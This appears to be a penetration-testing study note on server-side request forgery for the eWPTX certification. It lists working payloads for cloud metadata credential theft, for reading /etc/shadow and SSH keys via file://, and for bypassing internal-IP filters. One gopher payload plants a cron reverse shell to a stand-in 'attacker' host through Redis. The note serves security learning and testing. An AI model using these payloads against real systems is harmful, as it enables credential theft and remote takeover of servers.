2026-02-05 09:06

Status:

Tags: [[eWPTX]] [[Server-Side Attacks]] [[SSRF]]
###### Prerequisites: [[Server-Side Attacks - Overview]]
# Server-Side Request Forgery (SSRF)

## Overview

SSRF allows an attacker to trick a server into making unauthorized requests to internal or external resources.

The request is initiated by the server but controlled by attacker input.

Possible impact:

- sensitive data disclosure
- theft of authentication info
- internal network reconnaissance
- chaining into bigger impact (privilege escalation / RCE paths)
- file read/inclusion (in some implementations)

---

## What causes SSRF

- unvalidated URL/resource input (image fetchers, URL preview, webhooks)
- server has access to internal resources (not accessible to attacker)
- missing access controls for outbound requests

---

## Anatomy of an SSRF attack

1) identify a vulnerable endpoint that fetches a user-provided URL
2) manipulate input to point to internal or restricted resources
3) server performs the request
4) attacker extracts response or infers results via side effects

---

## Types of SSRF

- **Basic SSRF**: attacker can see response
- **Blind SSRF**: no direct response; infer via DNS/logs/timing
- **Internal recon SSRF**: probe internal services/ports
- **SSRF chaining**: combine SSRF with other weaknesses (cloud metadata, internal admin APIs, etc.)

---

## Common SSRF Payloads

### Cloud Metadata Endpoints

Cloud providers expose instance metadata on link-local addresses. SSRF can leak credentials, tokens, and configuration.

```
# AWS (IMDSv1 — no special headers required)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
http://169.254.169.254/latest/user-data/

# GCP (requires header: Metadata-Flavor: Google)
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/project/project-id

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/

# DigitalOcean
http://169.254.169.254/metadata/v1/
```

### Internal Services

```
# Common internal admin panels
http://localhost:8080/admin
http://127.0.0.1:8443/manager/html
http://127.0.0.1:9090/

# Databases and data stores
http://127.0.0.1:6379/          # Redis
http://127.0.0.1:9200/          # Elasticsearch
http://127.0.0.1:9200/_cat/indices
http://127.0.0.1:5984/_all_dbs  # CouchDB
http://127.0.0.1:27017/         # MongoDB

# Kubernetes
https://kubernetes.default.svc/api/v1/secrets
```

### Protocol-Based Payloads

```
# File protocol — read local files
file:///etc/passwd
file:///etc/shadow
file:///proc/self/environ
file:///proc/self/cmdline
file:///home/user/.ssh/id_rsa

# Gopher protocol — send raw TCP data (powerful for attacking internal services)
# Redis: SET a key
gopher://127.0.0.1:6379/_SET%20pwned%20true%0D%0A
# Redis: write a webshell via cron
gopher://127.0.0.1:6379/_*3%0D%0A$3%0D%0Aset%0D%0A$1%0D%0A1%0D%0A$57%0D%0A%0A%0A*/1 * * * * bash -i >& /dev/tcp/attacker/4444 0>&1%0A%0A%0D%0A

# Dict protocol — interact with dict-compatible services
dict://127.0.0.1:6379/INFO
```

---

## IP Bypass Techniques

When the application filters obvious internal IPs (`127.0.0.1`, `localhost`, `10.x.x.x`), use alternative representations:

### Decimal and Numeric Representations

```
# Decimal IP (127.0.0.1 = 2130706433)
http://2130706433/

# Octal representation
http://0177.0.0.1/

# Hex representation
http://0x7f000001/

# Mixed notation
http://127.1/              # Shorthand for 127.0.0.1
http://0/                  # Resolves to 0.0.0.0
```

### IPv6 Representations

```
http://[::1]/
http://[0:0:0:0:0:ffff:127.0.0.1]/
http://[::ffff:7f00:1]/
```

### DNS-Based Bypasses

```
# nip.io / sslip.io — wildcard DNS services that resolve to embedded IP
http://127.0.0.1.nip.io/
http://192.168.1.1.sslip.io/

# DNS rebinding — register a domain that alternates between attacker IP and 127.0.0.1
# First resolution → attacker IP (passes allowlist check)
# Second resolution → 127.0.0.1 (when server actually fetches)
# Tool: https://github.com/taviso/rbndr

# Custom domain pointing to 127.0.0.1
# Set A record for ssrf.yourdomain.com → 127.0.0.1
```

### URL Parser Confusion

```
# Credentials trick — some parsers treat text before @ as credentials
http://evil.com#@127.0.0.1/
http://attacker.com@127.0.0.1/

# Redirect bypass — attacker URL that 302-redirects to internal IP
# Host a page at https://attacker.com/redirect that returns:
#   HTTP/1.1 302 Found
#   Location: http://169.254.169.254/latest/meta-data/

# URL encoding
http://127.0.0.1%00@attacker.com/    # Null byte confusion
http://127%2e0%2e0%2e1/               # Encoded dots
```

---

## Blind SSRF Detection

When the application does not return the response body, use out-of-band techniques.

### DNS Callback

Use Burp Collaborator, interactsh, or a custom DNS server to detect if the server resolves a domain:

```
# Burp Collaborator
http://unique-id.burpcollaborator.net/

# interactsh (open-source alternative)
http://unique-id.interact.sh/
```

If a DNS query is received, the server followed the URL — confirming SSRF.

### Out-of-Band HTTP

```
# Point to attacker-controlled server and monitor access logs
http://attacker-controlled.com/ssrf-test

# Use webhook.site for quick OOB testing
http://webhook.site/<unique-uuid>
```

### Timing-Based Detection

Measure response time differences to infer internal port states:

- **Open port**: response returns relatively quickly (service responds)
- **Closed port**: connection refused immediately (fast failure)
- **Filtered port**: connection times out (slow response, often indicates firewall)

Compare response times for different internal ports to map the internal network.

---

## Testing Methodology

1. **Map all input surfaces**: identify every endpoint that accepts URLs, file paths, hostnames, or IP addresses (image fetchers, webhooks, import/export, PDF generators, URL previews)
2. **Test with external callback**: submit a Burp Collaborator or interactsh URL and check for DNS/HTTP interactions
3. **Test internal addresses**: try `127.0.0.1`, `localhost`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16` ranges
4. **Try different protocols**: `http://`, `https://`, `file://`, `gopher://`, `dict://`, `ftp://`
5. **Test bypass techniques**: if filtering is detected, cycle through decimal IP, IPv6, DNS rebinding, redirect-based, and URL parser tricks
6. **Enumerate cloud metadata**: always test cloud metadata endpoints — credential leakage is often critical severity
7. **Port scan via SSRF**: iterate through common ports on internal IPs and observe response differences
8. **Chain with other vulnerabilities**: combine SSRF with deserialization, XXE, or CRLF injection for increased impact

---

## Useful Tools

| Tool | Purpose |
|------|---------|
| Burp Collaborator | OOB interaction detection for blind SSRF |
| interactsh | Open-source Collaborator alternative |
| SSRFmap | Automated SSRF exploitation framework |
| Gopherus | Generate gopher payloads for SSRF (Redis, MySQL, etc.) |
| rbndr | DNS rebinding service for bypass testing |

---

## Diagram

![[Pics/server-side/ssrf-attack-surface.svg]]
